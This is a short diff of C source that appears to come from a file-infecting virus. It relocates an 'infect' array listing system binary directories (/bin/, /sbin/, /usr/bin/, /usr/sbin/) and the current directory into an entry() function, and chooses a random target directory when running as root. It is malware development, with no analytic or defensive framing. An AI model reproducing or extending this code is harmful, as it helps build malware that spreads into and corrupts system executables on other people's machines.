@@ -16,19 +16,17 @@ static inline unsigned int get_random_index(void)
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-struct directory infect[] =
-{
-	(struct directory){"/bin/", "", 5},
-	(struct directory){"/sbin/","", 6},
-	(struct directory){"/usr/bin/", "", 9},
-	(struct directory){"/usr/sbin/", "", 10},
-	(struct directory){"./", "", 2},
-};
-
-
 void entry(void)
 {
 	unsigned int index = 4;
+	struct directory infect[] =
+	{
+		(struct directory){"/bin/", "", 5},
+		(struct directory){"/sbin/","", 6},
+		(struct directory){"/usr/bin/", "", 9},
+		(struct directory){"/usr/sbin/", "", 10},
+		(struct directory){"./", "", 2},
+	};
 
 	if (getuid() == 0)
 		index = get_random_index();
